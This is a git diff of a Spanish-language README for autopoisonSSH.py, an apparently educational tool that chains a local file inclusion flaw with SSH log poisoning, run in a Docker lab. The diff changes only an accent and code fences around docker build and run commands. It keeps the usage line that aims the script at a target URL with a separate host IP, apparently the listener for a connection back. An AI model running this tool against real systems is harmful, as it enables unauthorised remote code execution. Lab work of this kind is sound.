@@ -50,7 +50,7 @@ En primer lugar debemos detecar la ruta donde se acontecede el **LFI**:
 
 ![Pasted image 20240806161403](https://github.com/user-attachments/assets/9238bfd1-c0f2-4eef-abbf-6729aa0457ca)
 
-En segundo y último lugar ejecutaremos el script pasandole los parámetros necesarios tal y como vemos a continuación:
+En segundo y último lugar ejecutaremos el script pasándole los parámetros necesarios tal y como vemos a continuación:
 
 ```shell
 python3 autopoisonSSH.py -u "http://172.17.0.2/index.php?filename" -t-ip 172.17.0.2 -h-ip 172.17.0.1
@@ -60,10 +60,16 @@ python3 autopoisonSSH.py -u "http://172.17.0.2/index.php?filename" -t-ip 172.17.
 
 ---
 ## Puesta en Práctica
+
 [Dockerfile](Dockerfile)
 
+```bash
 docker build -t logpoisoning_image .
+```
+
+```bash
 docker run -dit --name ssh_logpoisoning logpoisoning_image
+```
 
 ---
 ### Advertencia legal
